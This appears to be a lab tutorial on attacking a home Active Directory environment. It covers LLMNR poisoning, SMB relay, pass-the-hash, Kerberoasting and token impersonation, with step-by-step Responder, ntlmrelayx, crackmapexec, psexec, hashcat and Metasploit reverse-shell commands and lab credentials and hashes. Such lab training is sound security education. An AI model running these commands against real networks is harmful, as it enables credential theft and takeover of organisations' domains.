#Important Active Directory Network Attacks

1. LLMNR/NBT-NS poisoning

Link Local Multicast Name Resolution and NetBIOS Name Service are alternate ways to identify hosts in the network when DNS fails.

If DNS resolution for a particular host fails, the machine broadcasts a request to the entire network to find the correct host address via LLMNR. LLMNR is based on the DNS format and allows hosts on the same local link to perform name resolution for other hosts. LLMNR uses the UDP port 5355.

If even LLMNR fails, then NBT-NS will be used for name resolution. NBT-NS identifies systems in a local network by their NetBIOS name. NBT-NS utilizes the UDP port 137.

When LLMNR or NBTNS are used for name resolution, any host in the network can reply to the requests, which means we as an attacker can poison these requests by using tools such as Responder or Inveigh. We essentially pretend to be the machine whose name has to be resolved in the request and the victim machine sends us its NTLMv2 hash if there is authentication required for the name resolution to occur.

We can crack this NTLMv2 hash with a tool such as hashcat to get the password of the account in the victim machine.

### Attack Flow

1.  A host attempts to connect to the print server at `\\print01.inlanefreight.local`, but accidentally types in `\\printer01.inlanefreight.local`.
2.  The DNS server responds, stating that this host is unknown.
3.  The host then broadcasts out to the entire local network asking if anyone knows the location of `\\printer01.inlanefreight.local`.
4.  The attacker (us with Responder running) responds to the host stating that it is the `\\printer01.inlanefreight.local` that the host is looking for.
5.  The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6.  This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

### Steps to perform the attack

1.  Keep kali, SIMLAB-DC and SIMLAB-PC1 on at the same time.
2.  Run Responder on the kali linux terminal with the command:


    ```bash
    sudo responder -I eth0 -dvw
    ```

    * `-I`: mentions network interface to use for the attack
    * `-d`: Enable answers for netbios domain suffix queries
    * `-w`: Start the WPAD rogue proxy server
    * `-v`: increases verbosity of output

    ![responder image](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/responder_command.jpg)

3.  From the SIMLAB-PC1 system, go to file explorer and type `\\<IP address of the kali machine>`.

    ![pointing to kali IP image](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/pointing_to_kali_LLMNR_poisoning.jpg)

4.  When we check the terminal with Responder running on Kali, we see that the SIMLAB-PC1 system has sent over the username and NTLMv2 hash of the account running on it.

    ![responder_output](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/responder_output.jpg)

    This hash is of NTLMv2 type, therefore we have to use the Hashcat module `5600` to crack it.
    Add the hash to a `.txt` file and use the following Hashcat command on Kali to crack the password:

    ```bash
    hashcat -m 5600 hash.txt <path of wordlist>
    ```

    We can use a common wordlist like `rockyou.txt` or even tailor a wordlist specifically for the victim machine.

    ![LLMNR hash crack](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/LLMNR_hash_crack.jpg)

---

2. SMB Relay attack

SMB relay attack is a man-in-the-middle attack where the attacker intercepts and immediately relays an authentication request from the victim client to another system in the network over the SMB protocol, thus gaining unauthorized access over that system.

### Requirements for the attack to work

* SMB signing must be disabled.
* The credentials of the user we are relaying must be a local administrator on the machine to which the credentials are being relayed to.

### Flow of the attack

1.  The attacker tricks a victim into connecting to a malicious SMB server (e.g., via LLMNR/NBT-NS poisoning).
2.  The victim sends NTLM authentication data to the attacker.
3.  The attacker relays this authentication to another machine on the same network.
4.  If the machine doesn’t enforce SMB signing, it accepts the request, and the attacker gains unauthorized access, possibly with the victim's privileges.

### Steps to perform the attack

1.  Click the network section in the file explorer tab of both SIMLAB-PC1 and SIMLAB-PC2 and turn on network discovery and file sharing.
2.  Run Nmap with the NSE script `smb2-security-mode.nse`. This script tells us if SMB signing is enabled or disabled on the system.

    ```bash
    nmap --script=smb2-security-mode.nse -p 445 <subnet to scan>
    ```

3.  Edit the Responder config file located at `/etc/responder/Responder.conf` and set the SMB and HTTP settings to `Off` as we are not going to poison the SMB requests, we are just relaying the request.

    ![config_file_edit](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/responder_config_file_edit.jpg)

4.  Start Responder in a Kali terminal with the following command. We should see SMB and HTTP to be off.

    ```bash
    responder -I eth0 -dwv
    ```

    ![responder_smb_relay](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/responder_smb_relay.jpg)

5.  Add the IP address of the SIMLAB-PC2 system to a file named `targets.txt`. SIMLAB-PC2 is the victim machine here as if we recall correctly the `simlabuser1` account is a local admin on both SIMLAB-PC1 and SIMLAB-PC2.
6.  Run the `ntlmrelayx` tool with the `targets.txt` as an argument to set up the relay that will occur when an authentication request is sent from SIMLAB-PC1 to Kali, which will then be relayed to SIMLAB-PC2.

    ```bash
    ntlmrelayx.py -tf targets.txt -smb2support
    ```

    ![ntlmrelayx smb relay](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/ntlm_relayx_smb_relay.jpg)

7.  When the auth request from SIMLAB-PC1 is sent to Kali when `ntlmrelayx` and Responder are running, the SMB relay attack with the `ntlmrelayx` tool dumps the SAM database of the SIMLAB-PC2 system. The usernames and password hashes of accounts on a Windows system are stored in the SAM file - note that the hashes dumped here are local account hashes and are of the NTLMv1 format.

    ![smb_relay_to_kali](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/smb_relay_to_kali.jpg)
    ![smb_relay_sam_dump](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/smb_relay_sam_dump.jpg)

    NTLM v1 hashes can be cracked with Hashcat using the module number `1000` with an appropriate wordlist.

    ```bash
    hashcat -m 1000 hash.txt <path to the wordlist>
    ```

    ![smb_relay_hash_crack](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/smb_relay_hash_crack.jpg)

8.  We can even gain an interactive SMB shell with this attack by using the `-i` option in the `ntlmrelayx` tool like so:

    ```bash
    ntlmrelayx -tf targets.txt -smb2support -i
    ```

    * `-i`: interactive

    The `ntlmrelayx` tool sets up the interactive SMB shell on one of the ports in our Kali machine, which we can connect to and run various commands on the victim system - we can perform operations like changing the password of the user account, getting and putting files onto the system, etc.

    ![ntlm_relayx_shell](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/ntlm_relayx_interactive_shell.jpg)

    We can also run only specific commands using the `-c` option in the command. This command can even execute a reverse shell payload which can give us shell access to the machine. The `ntlmrelayx` tool comes with more such functionalities; read its documentation for understanding those functionalities.

---

3. Pass the password and Pass the hash attacks

Pass the password attack is an attack where we try valid credentials of a user account across the whole subnet to authenticate with services like SMB - we can authenticate to other machines on the network without needing to crack hashes (if we already have a password) or escalate privileges.

### Flow of the attack

1.  Capture a valid password via techniques like phishing, LLMNR poisoning, memory scraping, using Mimikatz tool etc.
2.  Reuse the password: We can use tools like Crackmapexec, psexec, wmiexec and smbclient to authenticate to services in the network like SMB or WinRM.

### Steps to perform the attack

1.  Use `crackmapexec` tool with the username, password and domain of the compromised account and run the attack over the entire subnet to check for valid authentications across all the systems.

    ```bash
    sudo crackmapexec smb 192.168.0.1/24 -u simlabuser1 -d SIMLAB.local -p Password1
    ```

    As `simlabuser1` is a local admin on both SIMLAB-PC2 and SIMLAB-PC1, this attack works on SIMLAB-PC2.

    ![pass_the_password_cme](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/pass_the_password_cme.jpg)

2.  Now that we know that the `simlabuser1` account exists on SIMLAB-PC2 as well, we can use `crackmapexec` again to dump the SAM database on SIMLAB-PC2 to view all the local user account hashes present on the system.

    ```bash
    sudo crackmapexec smb 192.168.0.226 -u simlabuser1 -d SIMLAB.local -p Password1 --sam
    ```

    ![pass_the_password_samdump](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/pass_the_password_samdump.jpg)

3.  We can now use `psexec.py` with the knowledge that the account exists on SIMLAB-PC2 and gain a shell on the system like so:

    ```bash
    psexec.py simlab/simlabuser1:Password1@192.168.0.226
    ```

    ![pass_the_password_psexecshell](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/pass_the_password_psexecshell.jpg)

---

Pass the hash attack is an attack where we try the hash of an account to authenticate across systems in the network without actually cracking the hash - depends on the same user account existing across multiple systems in the domain to work.

**Note**: Only NTLMv1 hashes can be used in a pass the hash attack and NTLMv2 hashes cannot be used.
Local hashes in the SAM database are stored in the NTLMv1 format.

### Flow of the attack

1.  Steal NTLMv1 hash: By using tools like `mimikatz`, `secretsdump.py` or Responder.
2.  Use the hash to authenticate to other systems in the same network/domain through services that accept NTLM authentication like SMB, WinRM and RDP - we will use the `crackmapexec` tool.

It is clear that the NTLM hash does not need to be cracked for this attack to be performed.

### Steps to perform the attack

1.  Use `secretsdump.py` on SIMLAB-PC1 to retrieve the local NTLMv1 hash of the `simlabuser1` account so we can perform a pass the hash attack across the network.

    ```bash
    sudo python /usr/share/doc/python3-impacket/examples/secretsdump.py simlab/simlabuser1:Password1@192.168.0.122
    ```

    ![secretsdump.py passthehash](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/secretsdump.py_passthehash.jpg)

    We see in the output of this command that “`64f12cddaa88057e06a81b54e73b949b`” is the NTLMv1 hash of the `simlabuser1` account.

2.  We use the previously found hash along with `crackmapexec` to run the pass the hash attack across the whole subnet to check if the same account exists on other devices thus granting us unauthorized access to those devices.

    ```bash
    sudo crackmapexec smb 192.168.0.1/24 -u "simlab user1" -H 64f12cddaa88057e06a81b54e73b949b --local-auth
    ```

    ![pass_the_hash](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/pass_the_hash.jpg)

3.  Similarly, we can also use the hash to gain shell access over another system using the `psexec` tool.

    ```bash
    python /usr/share/doc/python3-impacket/examples/psexec.py "simlab user1":@192.168.0.226  -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
    ```

    Note that both LM hash and NT hash are required for running `psexec.py` with the pass the hash attack.

    **Note**: This attack can be unreliable at times in terms of giving correct output of `Pwned!` on the systems like in this case.

---

4. Kerberoasting

Kerberoasting is a post-exploitation attack in Microsoft Active Directory environments. It allows an attacker who has valid domain credentials to request for and crack the hashes of service accounts in the domain. These service accounts have high privileges, making gaining access over them important for attackers.

### Flow of the attack

1.  **Authentication and SPN discovery**: Once the attacker is authenticated to an account on a system in the network, the attacker queries AD for accounts that have an SPN set. These accounts will usually be service accounts.
    * SPN or Service Principal Name is an identifier for services running in the AD environment. It associates an instance of a service with a service logon account.

2.  **Requesting the service tickets/TGS tickets**: The attacker requests Kerberos Ticket Granting Service (TGS) tickets for the identified service accounts (via their SPNs). Any authenticated user can request these tickets for any service. The Key Distribution Center (KDC), which includes the TGS, doesn't typically validate if the requesting user actually has permissions to access the service itself. It only validates that the requester is an authenticated domain user.

3.  **Extracting and cracking the NTLM hash of the account from the service ticket**: The TGS issues a service ticket to the attacker, and a portion of this ticket is encrypted with the NTLM hash of the service account. We can perform an offline brute-force attack on the ticket to guess the account’s password.

### Steps to perform the attack

1.  Run the tool `GetUserSPNs.py` from the Impacket toolkit with the domain name, the IP address of the domain controller, and a valid username and password combination for a domain account as the arguments to request for a TGS ticket.

    ```bash
    python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py simlab.local/simlabuser1:Password1 -dc-ip 192.168.0.217 -request
    ```

    ![tgs_ticket_kerberoasting](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/tgs_ticket_kerberoasting.jpg)

2.  Crack the TGS ticket using Hashcat with the module number `13100` and an appropriate wordlist to get the service account password and escalate privileges.

    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ hashcat -m 13100 tgsticket.txt /usr/share/wordlists/rockyou.txt -O

    hashcat (v6.2.6) starting

    OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
    ============================================================================================================================================
    * Device #1: cpu-sandybridge-AMD Ryzen 5 5600H with Radeon Graphics, 1435/2934 MB (512 MB allocatable), 4MCU

    Minimum password length supported by kernel: 0
    Maximum password length supported by kernel: 31

    Hashes: 1 digests; 1 unique digests, 1 unique salts
    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
    Rules: 1

    Optimizers applied:
    * Optimized-Kernel
    * Zero-Byte
    * Not-Iterated
    * Single-Hash
    * Single-Salt

    Watchdog: Temperature abort trigger set to 90c

    Host memory required for this attack: 0 MB

    Dictionary cache hit:
    * Filename..: /usr/share/wordlists/rockyou.txt
    * Passwords.: 14344385
    * Bytes.....: 139921507
    * Keyspace..: 14344385

    Cracking performance lower than expected?                 

    * Append -w 3 to the commandline.
      This can cause your screen to lag.

    * Append -S to the commandline.
      This has a drastic speed impact but can be better for specific attacks.
      Typical scenarios are a small wordlist but a large ruleset.

    * Update your backend API runtime / driver the right way:
      [https://hashcat.net/faq/wrongdriver](https://hashcat.net/faq/wrongdriver)

    * Create more work items to make use of your parallelization power:
      [https://hashcat.net/faq/morework](https://hashcat.net/faq/morework)

    $krb5tgs$23$*SQLService$SIMLAB.LOCAL$simlab.local/SQLService*$3b7c6c81249fea3b3829e5e0f493bfcd$d2d10c3cf9e62280d6882ec90cbbf631d6d78745ff25ad34e38a04d3494b5d1d0d0c971ad3c1754e92904c282f12436865e50c7f43a2d795b09cb1c1424da3dd18fc88378fb0eb27e7a012f48821ac55523f738a16c8323d13288faef4832aaab5975686ebe5eb7d76c3a221082913a7d25feac2f28cfd103370162ea3a91b832a9437eaa354a2b0313022b2e5355891f2e3cb26c4aa1a1dc432c9e6a2906c54f08d11e8d19fcab434c8e962e11798d87a223ba89719a2886544f5863368e801c6f5083630e91c3afb8c6ef842ddacd0d93622f10e398b125cc24114cdc5c1deba08d574d5e65d5898b96da79e381bd384eb16d356134fd81b4f932681801edb57117537a4d03d66e0c2f663fa19d55500cb785a72dc31ce423186219379457ffd9e1ba6abfc61b47685b9ce0881f439ca6ba4aad10ba1cb5132180a91415be581c46330a4d412cc512ed8574f210adffa4f660f85089ce964f04389e315d7e0aecedf49c337f0a90350a733c8e63c46152d0cc970d47b109583cb682871f3cfa06dcd9ec63199b372f355cc598ea3c6a245262f6ab6a42e32344a289c78f37354f0f485b3fbcc59eee45c8e23b4ce335d35f71746083a32e56896e52173aac72fa4442c63c857f4a0a18da29d78ae7c5e616e6d636a04926d3488d1cb815c84f434eac6cc61aad06b678795dabcdabe9dfb10d10b2fa288f803cec8fb25e493f48a02d1efc66f0f8996d63371d34688a87c51678a4191a2ed48176c91e296c98dc912ce132cc71ba87ae21ea82ee50b517a22616778cf8567edd0c71fad0959385565656325300544a843afbc1014eabd4959c2ec6c0ab19d254ec44b85c0685b8c5c47ee4ee86839daecb062fc2fdb26df829e10f6c0000c57ceb9cb5c67b1703afefc80cba42b253700e9038f3725312a4a23e079a191dc9957341e6221563b2973b45e5f0f2f0f4f088b38e4ef4f902d2cd0c8278e3a35edaf687a6957d366bc46556bf7708ffe31dd3babd0c40da80ecfd50648bd828dcc4f7d43681bd988934153afc232bcd4aaf565e87d1b5ecf6e57a5bbf3ff4454d5176074f6a9a2aad7afb5709fa6752ad8006b3dfa91d9bc8486256f865e6d817388f34dec3c92c1455a7a5ad5a507c24220846c195c80daa276f13582fa858476a7ef8a5a4969cd8bf11ff9dd0e7c7609dad9cb1541dd6911c761aa97df1fd280abaa17cd48207ffb2a8b4db965755045b3f377e932c0314e290c02164c0f6cd606c777f62eff5a8e81dc91513d9f4ef2fdee8b51117716c88e9c20ac4045befef155282a0b3e18abbaa71bf61d2d62caac73cba3ef282efdbd01da98c0f62071f9530c8b004d76f523318915ee0b38d5ac8844f19fb756dc72d644237f3ba0d273a92d3c08a476a6f7587dfbebf24e209eee20888f8ab166dfc6b204c757322245486d7e036d9c39915a2e0f1324f4e1488718327ff68ae2b2101d64a7aa92a94ccd48406fec85c82f89178e8935a23bc9c24dd4273f983e86ee8c7444fd14902f5fc73f7af2:MYpassword123#
                                                              
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
    Hash.Target......: $krb5tgs$23$*SQLService$SIMLAB.LOCAL$simlab.local/S...3f7af2
    Time.Started.....: Tue Jun  3 16:37:27 2025 (7 secs)
    Time.Estimated...: Tue Jun  3 16:37:34 2025 (0 secs)
    Kernel.Feature...: Optimized Kernel
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:  1333.4 kH/s (0.43ms) @ Accel:256 Loops:1 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 10846264/14344385 (75.61%)
    Rejected.........: 2104/10846264 (0.02%)
    Restore.Point....: 10845240/14344385 (75.61%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidate.Engine.: Device Generator
    Candidates.#1....: MZCHEALA -> MYRUBENS
    Hardware.Mon.#1..: Util: 61%

    Started: Tue Jun  3 16:37:25 2025
    Stopped: Tue Jun  3 16:37:36 2025
    ```

    As we can see, we now have the password of the `SQLService` account which is `MYpassword123#`. This account has equivalent privileges of the Domain Admin account - which means we have effectively pwned the domain.

---

5. Token Impersonation

Token impersonation is a post-exploitation attack in Microsoft AD environments, where an attacker gains the ability to impersonate another user by gaining control over the access token of that user - the attacker inherits their rights and privileges on the local system and potentially across the network.

A token is a sort of security badge/identifier that contains information about the user's identity, group membership and privileges the user holds. When a user logs on to a system, the system creates an access token for the user. Every process or thread initiated by the user contains a copy of the access token, and when the process tries to access a secured object, the system checks the access token of the user against the ACL or Access Control List of the object to determine whether access should be granted or not.

### Flow of the attack

1.  **Initial compromise/foothold on the network**: To perform this attack, the attacker first needs a valid set of credentials for an existing account on the system/domain. This can be done by various other techniques like phishing, exploiting a vulnerability, etc. Attackers typically need to have a certain level of privilege on the system to perform the attack - Administrator or SYSTEM privileges or specific privileges like `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.

2.  **Finding target tokens**: Once on the system, the attacker tries to find processes running under the context of other users, especially the users that have high privileges. Windows allows processes with appropriate privileges to impersonate or steal the access token of another process on the system.

3.  **Impersonating the token**: With `SeImpersonatePrivilege` on the attacker's process, it can obtain an impersonation thread from another process or thread, but this allows the attacker to act as the impersonated user only on the local system. However, with a more powerful privilege such as `SeAssignPrimaryTokenPrivilege`, the attacker can create a new process using a duplicate token of another user. This is more powerful as the attacker can fully act as the impersonated user and even request network resources.

4.  **Performing actions as the impersonated user**: After impersonating a token, our process operates with the rights and permissions of the impersonated user and can potentially allow us as the attacker to perform actions like accessing sensitive files and data, create new users, dump credentials, etc.

### Steps to perform the attack

We will use the Metasploit framework to perform the attack.

1.  Type `msfconsole` in the Kali terminal to start up the Metasploit framework.
2.  Search for the `psexec` exploit with the following command:

    ```bash
    msf6 > search exploit/windows/smb/psexec
    ```

    ![psexec options](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/psexec_options%20.jpg)

3.  Type `use 0` to use the module.
    Set the arguments of:
    * `RHOSTS` to the SIMLAB-PC1 system’s IP address
    * `SMBDomain` to be `simlab.local`
    * `SMBPass` as `Password1`
    * `SMBUser` as `simlabuser1`
    * `target` of `2` for native upload
    * `payload` to `windows/x64/meterpreter/reverse_tcp`
    * `lhost` to `eth0`

    ![token_impersonation_arguments](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/token_impersonation_metasploit_arguments.jpg)

4.  Enter `exploit` and hit enter to gain a `psexec` SMB shell on the SIMLAB-PC1 system as the `simlabuser1` user.
5.  Load the `incognito` tool which is used for token impersonation from the Meterpreter shell by typing the following command:

    ```meterpreter
    meterpreter> load incognito
    ```

6.  Use the `help` command from the Meterpreter shell and we will see the different actions that we can perform using the `incognito` tool.

    ![incognito_commands]()

7.  Use the `list_tokens` command with the `-u` option to view the tokens of user accounts on the system that are available to be impersonated.

    ```meterpreter
    meterpreter> list_tokens -u
    ```

    ![available_tokens_for_impersonation](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/available_tokens_for_impersonation.jpg)

    If the administrator account has recently logged on to the SIMLAB-PC1 system, we will see that the token of the administrator account is available to be impersonated by us in the list.

8.  Finally, we impersonate the administrator user on this system by using the `impersonate_token` command like so:

    ```meterpreter
    meterpreter> impersonate_token simlab\\\\administrator
    ```

    ![token_impersonation_attack](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/token_impersonation_attack.jpg)

    After running this command, we can see that we have successfully impersonated the administrator domain account on this system and can perform actions as this account now.

9.  To gain `NT AUTHORITY/SYSTEM` privileges again, type `rev2self` in the Meterpreter shell.
